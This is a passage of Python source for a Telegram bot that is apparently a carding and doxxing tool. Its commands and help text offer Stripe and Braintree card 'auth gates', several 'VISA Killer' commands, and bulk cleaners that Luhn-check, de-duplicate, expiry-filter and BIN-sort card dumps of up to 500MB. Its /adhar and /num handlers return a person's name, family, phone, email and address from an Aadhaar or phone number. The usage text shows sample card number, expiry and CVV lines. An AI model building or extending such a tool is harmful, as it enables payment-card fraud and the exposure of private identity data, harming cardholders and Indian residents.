        await update.message.reply_text("⚠️ Usage: /adhar <aadhaar_number>\nExample: /adhar 937480711484", reply_to_message_id=update.message.message_id)
        return
    
    aadhaar_number = context.args[0].strip()
    
    # Clean the aadhaar number
    aadhaar_number = re.sub(r'[^0-9]', '', aadhaar_number)
    
    if len(aadhaar_number) != 12 or not aadhaar_number.isdigit():
        await update.message.reply_text("❌ Invalid Aadhaar number. Please provide a valid 12-digit Aadhaar number.", reply_to_message_id=update.message.message_id)
        return
    
    try:
        msg = await update.message.reply_text("🔍 Fetching details...", reply_to_message_id=update.message.message_id)
        
        # Updated API endpoint with hidden URL
        api_url = "https://api.example.com/aadhar"  # Hidden API endpoint
        params = {"aadhar": aadhaar_number}
        
        # Make request with timeout
        response = requests.get(api_url, params=params, timeout=30)
        
        if response.status_code == 200:
            data = response.json()
            
            # Format the response
            formatted = (
                f"🆔 *Aadhaar Details*\n\n"
                f"👤 *Name:* {data.get('name', 'N/A')}\n"
                f"🆔 *Aadhaar:* {data.get('aadhaar', 'N/A')}\n"
                f"👨‍👩‍👧 *Father's Name:* {data.get('father_name', 'N/A')}\n"
                f"📞 *Mobile:* {data.get('mobile', 'N/A')}\n"
                f"📧 *Email:* {data.get('email', 'N/A')}\n"
                f"🏠 *Address:* {data.get('address', 'N/A')}"
            )
            
            await msg.edit_text(formatted, parse_mode="Markdown")
        else:
            await msg.edit_text("❌ Error fetching details. Please try again later.")
    
    except requests.exceptions.Timeout:
        await update.message.reply_text("⏱️ Request timed out. Please try again.", reply_to_message_id=update.message.message_id)
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"❌ Error connecting to service: {str(e)[:100]}", reply_to_message_id=update.message.message_id)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", reply_to_message_id=update.message.message_id)

# ==== 4.4 Admin Commands: /on and /off ====
async def on_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enable a command"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only command.", reply_to_message_id=update.message.message_id)
        return
    
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /on <command>\nExample: /on bin", reply_to_message_id=update.message.message_id)
        return
    
    cmd = context.args[0].lower().strip()
    
    if cmd not in CMD_KEYS:
        await update.message.reply_text(f"❌ Invalid command. Available commands: {', '.join(CMD_KEYS)}", reply_to_message_id=update.message.message_id)
        return
    
    cmd_status[cmd] = True
    save_users()
    
    await update.message.reply_text(f"✅ Command `{cmd}` has been enabled.", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

async def off_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Disable a command"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only command.", reply_to_message_id=update.message.message_id)
        return
    
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /off <command>\nExample: /off bin", reply_to_message_id=update.message.message_id)
        return
    
    cmd = context.args[0].lower().strip()
    
    if cmd not in CMD_KEYS:
        await update.message.reply_text(f"❌ Invalid command. Available commands: {', '.join(CMD_KEYS)}", reply_to_message_id=update.message.message_id)
        return
    
    cmd_status[cmd] = False
    save_users()
    
    await update.message.reply_text(f"✅ Command `{cmd}` has been disabled.", parse_mode="Markdown", reply_to_message_id=update.message.message_id)


# ==== 4.4.1 Admin Utilities: /ram, /cleanram, /backup ====
def _fmt_bytes(n: float | int) -> str:
    try:
        n = float(n)
    except Exception:
        return "N/A"
    units = ["B", "KB", "MB", "GB", "TB", "PB"]
    i = 0
    while n >= 1024 and i < len(units) - 1:
        n /= 1024.0
        i += 1
    if i == 0:
        return f"{int(n)} {units[i]}"
    return f"{n:.2f} {units[i]}"


async def ram_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show runtime stats (RAM/CPU/Disk/Uptime). Admin only."""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only command.", reply_to_message_id=update.message.message_id)
        return

    uptime = format_timedelta(datetime.now() - start_time)
    proc = psutil.Process(os.getpid())

    # CPU
    cpu_count = psutil.cpu_count(logical=True) or 0
    cpu_phys = psutil.cpu_count(logical=False) or 0
    try:
        load1, load5, load15 = os.getloadavg()
        load_txt = f"{load1:.2f}, {load5:.2f}, {load15:.2f}"
    except Exception:
        load_txt = "N/A"

    # Memory
    vm = psutil.virtual_memory()
    sm = psutil.swap_memory()
    pm = proc.memory_info()

    # Disk ("ROM" in your wording)
    try:
        root_du = shutil.disk_usage("/")
        root_disk = f"{_fmt_bytes(root_du.used)} / {_fmt_bytes(root_du.total)} ({(root_du.used / root_du.total * 100.0):.1f}%)"
    except Exception:
        root_disk = "N/A"

    try:
        cwd = os.getcwd()
    except Exception:
        cwd = "/"

    try:
        cwd_du = shutil.disk_usage(cwd)
        cwd_disk = f"{_fmt_bytes(cwd_du.used)} / {_fmt_bytes(cwd_du.total)} ({(cwd_du.used / cwd_du.total * 100.0):.1f}%)"
    except Exception:
        cwd_disk = "N/A"

    # Process details
    try:
        threads = proc.num_threads()
    except Exception:
        threads = "N/A"
    try:
        fds = proc.num_fds()
    except Exception:
        fds = "N/A"

    text = (
        "🧠 *Bot Runtime Details*\n\n"
        f"⏱ *Uptime:* `{uptime}`\n"
        f"🖥 *Platform:* `{platform.platform()}`\n"
        f"🐍 *Python:* `{platform.python_version()}`\n"
        f"🧩 *PID:* `{os.getpid()}`\n\n"
        "⚙️ *CPU*\n"
        f"• vCPU (logical): `{cpu_count}`\n"
        f"• CPU (physical): `{cpu_phys}`\n"
        f"• Load avg (1/5/15): `{load_txt}`\n\n"
        "💾 *RAM*\n"
        f"• Total: `{_fmt_bytes(vm.total)}`\n"
        f"• Used: `{_fmt_bytes(vm.used)}` ({vm.percent}%)\n"
        f"• Available: `{_fmt_bytes(vm.available)}`\n"
        f"• Process RSS: `{_fmt_bytes(pm.rss)}`\n"
        f"• Process VMS: `{_fmt_bytes(pm.vms)}`\n"
        f"• Threads: `{threads}`\n"
        f"• Open FDs: `{fds}`\n\n"
        "🧷 *Swap*\n"
        f"• Total: `{_fmt_bytes(sm.total)}`\n"
        f"• Used: `{_fmt_bytes(sm.used)}` ({sm.percent}%)\n\n"
        "💽 *Disk*\n"
        f"• `/`: `{root_disk}`\n"
        f"• `{cwd}`: `{cwd_disk}`\n"
    )
    await update.message.reply_text(text, parse_mode="Markdown", reply_to_message_id=update.message.message_id)


def _kill_orphan_chrome_children() -> dict:
    """
    Best-effort cleanup: terminate chrome/chromedriver child processes.
    This can free RAM if Selenium got stuck, but may interrupt running checks.
    """
    proc = psutil.Process(os.getpid())
    killed = 0
    failed = 0
    targets = []
    try:
        targets = proc.children(recursive=True)
    except Exception:
        targets = []

    for p in targets:
        try:
            name = (p.name() or "").lower()
            if "chromedriver" not in name and "chrome" not in name:
                continue
            p.terminate()
            killed += 1
        except Exception:
            failed += 1

    # Give them a moment, then hard kill leftovers
    try:
        gone, alive = psutil.wait_procs(targets, timeout=2)
        for p in alive:
            try:
                name = (p.name() or "").lower()
                if "chromedriver" in name or "chrome" in name:
                    p.kill()
            except Exception:
                failed += 1
    except Exception:
        pass

    return {"terminated": killed, "failed": failed}


async def cleanram_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Best-effort memory cleanup. Admin only."""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only command.", reply_to_message_id=update.message.message_id)
        return

    before = psutil.Process(os.getpid()).memory_info().rss

    # Python-level cleanup
    try:
        gc.collect()
    except Exception:
        pass

    # Clear a couple of known caches
    try:
        bin_cache.clear()
    except Exception:
        pass

    killed_info = None
    # Optional: /cleanram kill -> try to terminate chrome/chromedriver children
    if context.args and context.args[0].lower().strip() in ("kill", "force"):
        killed_info = _kill_orphan_chrome_children()

    after = psutil.Process(os.getpid()).memory_info().rss
    freed = before - after

    msg = (
        "🧹 *CleanRAM complete*\n"
        f"• RSS before: `{_fmt_bytes(before)}`\n"
        f"• RSS after: `{_fmt_bytes(after)}`\n"
        f"• Freed (approx): `{_fmt_bytes(freed)}`\n"
    )
    if killed_info:
        msg += f"• Chrome cleanup: terminated `{killed_info['terminated']}`, failed `{killed_info['failed']}`\n"
    msg += "\n_Note: memory may not drop immediately due to allocator/OS behavior._"
    await update.message.reply_text(msg, parse_mode="Markdown", reply_to_message_id=update.message.message_id)


async def backup_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Zip and send project backups to admin."""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only command.", reply_to_message_id=update.message.message_id)
        return

    base_dir = os.path.dirname(os.path.abspath(__file__))
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_name = f"backup_{ts}.zip"

    status = await update.message.reply_text("📦 Creating backup...", reply_to_message_id=update.message.message_id)

    tmp_path = None
    try:
        fd, tmp_path = tempfile.mkstemp(prefix="bot_backup_", suffix=".zip")
        os.close(fd)

        with zipfile.ZipFile(tmp_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(base_dir):
                # Skip junk folders
                dirs[:] = [d for d in dirs if d not in (".git", "__pycache__", ".venv", "venv", "node_modules")]

                for fn in files:
                    if fn.endswith((".pyc", ".tmp")):
                        continue
                    if not (fn.endswith(".py") or fn.endswith(".json") or fn in ("Dockerfile", "Dockerfile.txt")):
                        continue
                    abs_path = os.path.join(root, fn)
                    rel_path = os.path.relpath(abs_path, base_dir)
                    zf.write(abs_path, rel_path)

        with open(tmp_path, "rb") as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename=zip_name,
                caption=f"✅ Backup created: `{zip_name}`",
                parse_mode="Markdown",
                reply_to_message_id=update.message.message_id,
            )
        await status.edit_text("✅ Backup sent.")
    except Exception as e:
        await status.edit_text(f"❌ Backup failed: {str(e)[:200]}")
    finally:
        if tmp_path and os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except Exception:
                pass

# ==== 4.5 Basic Bot Commands ====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Welcome! Use /cmds to see available commands.", reply_to_message_id=update.message.message_id)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "🤖 *Card Bot Help*\n\n"
        "🔐 *Auth Commands:*\n"
        "• /st <card> - Stripe Auth V1\n"
        "• /bt <card> - Braintree Auth-1\n"
        "• /chk <card> - Braintree Auth-2\n\n"
        "🗡️ *Visa Killer Commands:*\n"
        "• /kill <card> - VISA Killer\n"
        "• /kd <card> - VISA Killer #2\n"
        "• /ko <card> - VISA Killer #3\n"
        "• /zz <card> - Killed v5 (fast)\n"
        "• /dd <card> - Killed v6 (ultra-fast)\n\n"
        "🔧 *Data Processing:*\n"
        "• /filter <data|file> - Fast card filter (new)\n"
        "• /clean <data|file> - Advanced card cleaner\n"
        "• /sort <data|file> - Clean & sort cards\n"
        "• /bin <bins/cards> - BIN lookup\n\n"
        "🔍 *Details Fetching:*\n"
        "• /num <phone> - Get details by phone number\n"
        "• /adhar <aadhaar> - Get details by Aadhaar\n\n"
        "🧰 *Basic Commands:*\n"
        "• /start - Welcome message\n"
        "• /help - This help message\n"
        "• /cmds - Command list\n"
        "• /id - Your Telegram ID\n"
        "• /status - Bot status\n"
        "• /version - Bot version info\n\n"
        "📝 *Card Format:*\n"
        "`CC|MM|YY|CVV` or `CC MM YY CVV`\n\n"
        "⚠️ *Note:* Some commands require admin approval."
    )
    await update.message.reply_text(help_text, parse_mode="Markdown", reply_to_message_id=update.message.message_id)

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id

    # Grade: S=admin, A=approved (any), D=not approved
    if is_admin(uid):
        grade = "S"
    else:
        is_any_approved = uid in approved_all or any(uid in approved_cmds[k] for k in CMD_KEYS)
        grade = "A" if is_any_approved else "D"

    name = " ".join([p for p in [user.first_name, user.last_name] if p]) or "N/A"
    username = f"@{user.username}" if user.username else "N/A"

    caption = (
        "👤 *User Info*\n\n"
        f"• *Name:* `{name}`\n"
        f"• *Username:* `{username}`\n"
        f"• *User ID:* `{uid}`\n"
        f"• *Grade:* `{grade}`\n"
    )

    # Send profile photo if available. If Telegram returns an animated/video profile file,
    # try sending it as an animation first. Otherwise, fallback to a generic GIF ("gift").
    try:
        photos = await context.bot.get_user_profile_photos(user_id=uid, limit=1)
        if photos.total_count and photos.photos:
            file_id = photos.photos[0][-1].file_id  # highest resolution of first photo set
            try:
                f = await context.bot.get_file(file_id)
                file_path = (getattr(f, "file_path", "") or "").lower()
                is_animated = file_path.endswith((".mp4", ".gif", ".webm"))
            except Exception:
                is_animated = False

            if is_animated:
                try:
                    await context.bot.send_animation(
                        chat_id=update.effective_chat.id,
                        animation=file_id,
                        caption=caption,
                        parse_mode="Markdown",
                        reply_to_message_id=update.message.message_id,
                    )
                    return
                except Exception:
                    pass

            await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=file_id,
                caption=caption,
                parse_mode="Markdown",
                reply_to_message_id=update.message.message_id,
            )
            return
    except Exception:
        pass

    try:
        await context.bot.send_animation(
            chat_id=update.effective_chat.id,
            animation="https://media.giphy.com/media/JIX9t2j0ZTN9S/giphy.gif",
            caption=caption,
            parse_mode="Markdown",
            reply_to_message_id=update.message.message_id,
        )
    except Exception:
        await update.message.reply_text(caption, parse_mode="Markdown", reply_to_message_id=update.message.message_id)

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = format_timedelta(datetime.now() - start_time)
    t0 = time.perf_counter()
    msg = await update.message.reply_text("⏳ Checking status...", reply_to_message_id=update.message.message_id)
    ping_ms = (time.perf_counter() - t0) * 1000.0
    await msg.edit_text(f"✅ Bot is running.\n⏱ Uptime: {uptime}\n🏓 Ping: {ping_ms:.0f} ms")

async def version_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Public command: show build/runtime version info."""
    uptime = format_timedelta(datetime.now() - start_time)
    py = sys.version.split()[0]
    plat = f"{platform.system()} {platform.release()}"
    await update.message.reply_text(
        "\n".join(
            [
                "ℹ️ *Version Info*",
                f"• *App:* `{APP_VERSION}`",
                f"• *Python:* `{py}`",
                f"• *Platform:* `{plat}`",
                f"• *Uptime:* `{uptime}`",
            ]
        ),
        parse_mode="Markdown",
        reply_to_message_id=update.message.message_id,
    )

async def health_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show health status of all browser commands with auto-repair info (Admin only)"""
    uid = update.effective_user.id
    
    # Admin only
    if not is_admin(uid):
        await update.message.reply_text("⛔ This command is for admins only.", reply_to_message_id=update.message.message_id)
        return
    
    # Get system stats
    try:
        mem = psutil.virtual_memory()
        cpu = psutil.cpu_percent(interval=0.1)
        mem_used = mem.percent
    except:
        mem_used = 0
        cpu = 0
    
    # Get all command health
    health_data = get_all_health()
    uptime = format_timedelta(datetime.now() - start_time)
    
    # Build health display
    lines = ["🏥 *Browser Commands Health*", "━━━━━━━━━━━━━━━━━━━━━━", ""]
    
    overall_health = 0
    active_cmds = 0
    repairs_needed = []
    
    for cmd in BROWSER_CMDS:
        data = health_data[cmd]
        health = data["health"]
        bar = get_health_bar(health)
        
        # Track overall health
        if data["total"] > 0:
            overall_health += health
            active_cmds += 1
        
        # Check if repair needed
        if health < 30 and data["total"] > 0:
            repairs_needed.append(cmd)
        
        # Status indicator
        if data["last_status"] == "success":
            status = "✅"
        elif data["last_status"] == "failure":
            status = "❌"
        else:
            status = "⚪"
        
        # Format line
        lines.append(f"`/{cmd}` {bar}")
        lines.append(f"   {status} {data['success']}✓ / {data['failure']}✗ ({data['total']} total)")
    
    # Calculate overall health
    avg_health = overall_health // active_cmds if active_cmds > 0 else 100
    
    lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 *Overall Health:* {get_health_bar(avg_health)}")
    lines.append(f"⏱ *Uptime:* `{uptime}`")
    lines.append(f"💾 *Memory:* `{mem_used:.1f}%` | 🖥 *CPU:* `{cpu:.1f}%`")
    
    # Auto-repair status
    if repairs_needed:
        lines.append("")
        lines.append(f"⚕️ *Auto-Repair Active:* `/{', /'.join(repairs_needed)}`")
        lines.append("_Failure history reduced to allow recovery_")
    
    # Admin reset option
    if is_admin(uid):
        lines.append("")
        lines.append("🔧 *Admin:* `/health reset` to clear all stats")
        lines.append("🔧 *Admin:* `/health reset <cmd>` to clear specific cmd")
    
    # Check for reset command
    if context.args and is_admin(uid):
        arg = context.args[0].lower()
        if arg == "reset":
            if len(context.args) > 1:
                cmd_to_reset = context.args[1].lower()
                if cmd_to_reset in BROWSER_CMDS:
                    reset_cmd_health(cmd_to_reset)
                    await update.message.reply_text(
                        f"✅ Health stats reset for `/{cmd_to_reset}`",
                        parse_mode="Markdown",
                        reply_to_message_id=update.message.message_id
                    )
                    return
            else:
                reset_cmd_health()
                await update.message.reply_text(
                    "✅ All health stats have been reset!",
                    reply_to_message_id=update.message.message_id
                )
                return
    
    await update.message.reply_text(
        "\n".join(lines),
        parse_mode="Markdown",
        reply_to_message_id=update.message.message_id
    )

async def bin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid, "bin"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("bin"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw = " ".join(context.args) if context.args else ""
    if not raw and update.message.reply_to_message:
        raw = update.message.reply_to_message.text

    if not raw:
        await update.message.reply_text("⚠️ Usage: /bin <bins/cards/mixed text>", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    # Extract all 6+ digit number sequences (max 30 bins)
    bin_candidates = set()
    for match in re.findall(r"\d{6,16}", raw):
        bin_candidates.add(match[:6])
        if len(bin_candidates) >= 30:  # Limit to 30 bins
            break

    if not bin_candidates:
        await update.message.reply_text("❌ No valid BINs or cards found.", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    msg = "**🔍 BIN Lookup Results:**\n"
    for bin_ in sorted(bin_candidates):
        info, details = get_bin_info(bin_)
        
        # Format with country flag
        country = details.get('country', 'Unknown')
        country_flag = details.get('country_flag', '')
        bank = details.get('bank', 'Unknown')
        brand = details.get('brand', 'Unknown')
        type_ = details.get('type', 'Unknown')
        
        # FIXED: Format with clickable BIN number using monospace
        formatted_info = f"*BIN:* `{bin_}`\n"
        formatted_info += f"*Info:* {brand} - {type_}\n"
        formatted_info += f"*Bank:* {bank}\n"
        formatted_info += f"*Country:* {country_flag} {country}\n"
        
        msg += f"\n{formatted_info}"

    await update.message.reply_text(msg, parse_mode="Markdown", reply_to_message_id=update.message.message_id)

# ==== 4.6 Updated /cmds Command ====
async def cmds_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    isadm = is_admin(uid)

    def lock(line: str, cmd_key: str | None) -> str:
        if cmd_key is None:
            return line  # public tool
        
        status_icon = "✅" if is_cmd_enabled(cmd_key) else "❌"
        approval_icon = "" if is_approved(uid, cmd_key) else "🔒"
        return f"{line} {status_icon}{approval_icon}"

    parts = []

    # Auth Gates
    parts.append("🔐 *Auth Gates*\n" + "\n".join([
        lock("/st <card> — Stripe Auth V1", "st"),
        lock("/bt <card> — Braintree Auth-1", "bt"),
        lock("/chk <card> — Braintree Auth-2 (Under Development)", "chk"),
    ]))

    # Visa Killer Gates
    parts.append("🗡️ *Visa Killer Gates*\n" + "\n".join([
        lock("/kill <card> — VISA Killer", "kill"),
        lock("/kd <card> — VISA Killer #2", "kd"),
        lock("/ko <card> — VISA Killer #3", "ko"),
        lock("/zz <card> — Killed v5 (fast)", "zz"),
        lock("/dd <card> — Killed v6 (ultra-fast)", "dd"),
    ]))

    # Data Processing Tools
    parts.append("🔧 *Data Processing Tools*\n" + "\n".join([
        lock("/filter <data|file> — Fast card filter (new)", "filter"),
        lock("/clean <data|file> — Advanced cleaner & organizer", "clean"),
        lock("/sort <data|file> — Clean & sort messy cards", "sort"),
        lock("/bin <bins/cards/mixed> — BIN lookup", "bin"),
    ]))

    # Details Fetching Tools
    parts.append("🔍 *Details Fetching Tools*\n" + "\n".join([
        lock("/num <number> — Get details by phone number", "num"),
        lock("/adhar <aadhaar> — Get details by Aadhaar number", "adhar"),
    ]))

    # Basic Tools
    parts.append("🧰 *Basic Tools*\n" + "\n".join([
        "/start — Welcome message",
        "/help — How to use the bot",
        "/cmds — Show command list",
        "/id — Show your Telegram ID",
        "/status — Show bot status",
        "/version — Bot version info",
    ]))

    if isadm:
        parts.append("🛠️ *Admin Commands*\n" + "\n".join([
            "/approve <id> <cmd|all> — Approve access",
            "/unapprove <id> <cmd|all> — Revoke access",
            "/remove <id> — Remove user (all approvals)",
            "/ban <id> — Ban user",
            "/unban <id> — Unban user",
            "/on <cmd> — Enable command",
            "/off <cmd> — Disable command",
            "/health — Browser commands health",
            "/ram — Show RAM/CPU/Disk details",
            "/cleanram [kill] — Best-effort memory cleanup",
            "/backup — Zip & send .py/.json files",
            f"\n✅ Approved (global): {len(approved_all)}",
        ]))

    # Footer note for locked cmds
    locked_cmds = [cmd for cmd in CMD_KEYS if not is_approved(uid, cmd)]
    if locked_cmds:
        parts.append("🔒 _Locked items require admin approval._")
    
    # Legend
    parts.append("📝 *Legend:* ✅ = Enabled, ❌ = Disabled, 🔒 = Requires approval")

    text = "📋 *Command List*\n\n" + "\n\n".join(parts)
    await update.message.reply_text(text, parse_mode="Markdown", reply_to_message_id=update.message.message_id)

# ==== 4.7 /clean Command (Fixed) ====
async def clean_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    uname = update.effective_user.first_name or "User"
    username = update.effective_user.username or uname
    
    if not is_approved(uid, "clean"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("clean"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return
    
    # Check if message is a reply
    if update.message.reply_to_message:
        replied_msg = update.message.reply_to_message
        data_text = ""
        
        # Check for document attachment
        if replied_msg.document:
            file_size = replied_msg.document.file_size
            if file_size > 500 * 1024 * 1024:  # 500MB limit for /clean
                await update.message.reply_text("⚠️ File too large. Maximum size is 500MB.", reply_to_message_id=update.message.message_id)
                return
            
            # Download file
            processing_msg = await update.message.reply_text("📥 Downloading file...", reply_to_message_id=update.message.message_id)
            try:
                file = await context.bot.get_file(replied_msg.document.file_id)
                data_text = await download_file_content(file)
                
                if not data_text.strip():
                    await processing_msg.edit_text("❌ File is empty or could not be read.")
                    return
                    
                await processing_msg.edit_text("🔍 Processing file content...")
            except Exception as e:
                await processing_msg.edit_text(f"❌ Error downloading file: {str(e)}")
                return
        else:
            # Get text from replied message
            data_text = replied_msg.text or replied_msg.caption or ""
    else:
        # Get text from command arguments
        data_text = " ".join(context.args) if context.args else ""
    
    if not data_text or not data_text.strip():
        usage_text = (
            "🧹 Advanced Card Cleaner (OPTIMIZED)\n\n"
            "📝 Usage:\n"
            "• /clean <messy_data> - Clean & organize cards\n"
            "• Reply to a message with /clean\n"
            "• Reply to a file with /clean\n\n"
            "⚡ Features:\n"
            "• Ultra-fast processing (300MB+ support)\n"
            "• Luhn validation & expiry check\n"
            "• BIN lookup (lazy-loaded)\n"
            "• Interactive filters\n"
            "• Multi-category export\n\n"
            "📁 Supports: TXT, CSV, JSON, any text file\n\n"
            "Example:\n"
            "/clean 4403932640339759 03/27 401\n"
            "5583410027167381 05/30 896"
        )
        await update.message.reply_text(usage_text, reply_to_message_id=update.message.message_id)
        return
    
    # Start processing
    start_time_processing = time.time()
    status_msg = await update.message.reply_text("🧹 Cleaning and organizing data... This may take a moment.", reply_to_message_id=update.message.message_id)
    
    try:
        # Extract and organize cards
        organized_data, stats = extract_and_clean_cards_advanced(data_text)
        total_found = stats['valid']
        
        processing_time = time.time() - start_time_processing
        
        if total_found == 0:
            await status_msg.edit_text(
                f"❌ No valid cards found.\n"
                f"📄 Raw matches: {stats['total_raw']}\n"
                f"🗑️ Junk removed: {stats['junk']}\n"
                f"⏰ Expired removed: {stats['expired']}\n"
                f"♻️ Duplicates removed: {stats['duplicates']}"
            )
            return
        
        # Generate session ID (shorter)
        session_id = f"c_{uid}_{int(time.time()) % 10000}"
        
        # Store organized data in context
        context.user_data[session_id] = {
            'organized': organized_data,
            'stats': stats,
            'user_id': uid,
            'username': username,
            'timestamp': time.time(),
            'session_id': session_id,
            'processing_time': processing_time
        }
        
        # Clean old sessions (older than 2 hours)
        for key in list(context.user_data.keys()):
            if key.startswith("c_"):
                session_data = context.user_data[key]
                if time.time() - session_data.get('timestamp', 0) > 7200:  # 2 hours
                    del context.user_data[key]
        
        # Prepare main message with PLAIN TEXT (no Markdown)
        stats_text = (
            f"🧹 Cleaning Results\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📊 Statistics\n"
            f"• Total Valid Cards: {total_found:,}\n"
            f"• Raw Matches Found: {stats['total_raw']:,}\n"
            f"• Junk Removed: {stats['junk']:,}\n"
            f"• Expired Removed: {stats['expired']:,}\n"
            f"• Duplicates Removed: {stats['duplicates']:,}\n"
            f"• Unique BINs: {stats['bins_found']:,}\n\n"
            f"⏱ Processing: {processing_time:.2f}s\n"
            f"📋 Session: {session_id}\n"
            f"👤 User: {username}\n\n"
            f"📁 Select a category:"
        )
        
        # Create category buttons - 2 buttons per row (OPTIMIZED)
        keyboard = []
        
        # Row 1: BINs and Expiry (fast categories)
        keyboard.append([
            InlineKeyboardButton(f"🔢 BINs ({stats['bins_found']})", callback_data=f"c_cat:b:0:{session_id}"),
            InlineKeyboardButton(f"📅 Expiry ({stats['years_found']} yrs)", callback_data=f"c_cat:e:0:{session_id}")
        ])
        
        # Row 2: Countries and Types (lazy-load)
        keyboard.append([
            InlineKeyboardButton("🌍 Countries", callback_data=f"c_cat:co:0:{session_id}"),
            InlineKeyboardButton("💳 Types", callback_data=f"c_cat:t:0:{session_id}")
        ])
        
        # Row 3: Levels and Brands (lazy-load)
        keyboard.append([
            InlineKeyboardButton("⭐ Levels", callback_data=f"c_cat:l:0:{session_id}"),
            InlineKeyboardButton("🏦 Brands", callback_data=f"c_cat:br:0:{session_id}")
        ])
        
        # Row 4: All Cards and Clear
        keyboard.append([
            InlineKeyboardButton(f"📋 All Cards ({total_found})", callback_data=f"c_cat:a:0:{session_id}"),
            InlineKeyboardButton("🗑️ Clear", callback_data=f"c_clr:{session_id}")
        ])
        
        # Row 5 - Bin Search Button
        keyboard.append([
            InlineKeyboardButton("🔍 Search BIN", callback_data=f"c_bin_search:{session_id}")
        ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await status_msg.edit_text(stats_text, reply_markup=reply_markup)
        
    except Exception as e:
        error_trace = traceback.format_exc()
        print(f"Clean error: {error_trace}")
        error_msg = f"❌ Error processing data: {str(e)[:100]}"
        await status_msg.edit_text(error_msg)
        
        # Send full error to admin
        if uid != BOT_ADMIN_ID:
            try:
                await context.bot.send_message(
                    BOT_ADMIN_ID,
                    f"❌ Clean error from user {uid}:\n{error_trace[:1000]}"
                )
            except:
                pass

# ==== 4.8 Clean Callback Handler (FIXED Year-Month Navigation) ====
async def clean_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle clean command callbacks - FIXED with year-month navigation and bin search"""
    query = update.callback_query
    # FIXED: Add timeout handling for answer()
    try:
        await query.answer()
    except Exception:
        pass  # Ignore timeout errors when answering callbacks
    
    user_id = query.from_user.id
    data = query.data
    
    if not data:
        return
    
    # Handle bin search
    if data.startswith("c_bin_search:"):
        session_id = data.split(":")[1]
        if session_id not in context.user_data:
            await query.edit_message_text("❌ Session expired. Please run /clean again.")
            return
        
        # Store session_id in user_data for bin search
        context.user_data[f"bin_search_session_{user_id}"] = session_id
        
        keyboard = [
            [InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🔍 *BIN Search*\n\n"
            "Please send a BIN number (first 6 digits of a card) to search for all cards with that BIN.\n\n"
            "Example: `411111` or `531462`",
            parse_mode="Markdown",
            reply_markup=reply_markup
        )
        return
    
    # Handle clear session
    if data.startswith("c_clr:"):
        session_id = data.split(":")[1]
        if session_id in context.user_data:
            del context.user_data[session_id]
        await query.edit_message_text("🗑️ Session cleared. Run /clean again to process new data.")
        return
    
    # Handle back to main menu
    elif data.startswith("c_back:"):
        session_id = data.split(":")[1]
        if session_id not in context.user_data:
            await query.edit_message_text("❌ Session expired. Please run /clean again.")
            return
        
        session_data = context.user_data[session_id]
        organized_data = session_data['organized']
        stats = session_data['stats']
        total_found = stats['valid']
        username = session_data['username']
        processing_time = session_data['processing_time']
        
        # Prepare main message with PLAIN TEXT
        stats_text = (
            f"🧹 Cleaning Results\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📊 Statistics\n"
            f"• Total Valid Cards: {total_found:,}\n"
            f"• Raw Matches Found: {stats['total_raw']:,}\n"
            f"• Junk Removed: {stats['junk']:,}\n"
            f"• Expired Removed: {stats['expired']:,}\n"
            f"• Duplicates Removed: {stats['duplicates']:,}\n"
            f"• Unique BINs: {stats['bins_found']:,}\n\n"
            f"⏱ Processing: {processing_time:.2f}s\n"
            f"📋 Session: {session_id}\n"
            f"👤 User: {username}\n\n"
            f"📁 Select a category:"
        )
        
        # Create category buttons - 2 buttons per row
        keyboard = []
        
        # Row 1: BINs and Expiry (fast categories)
        keyboard.append([
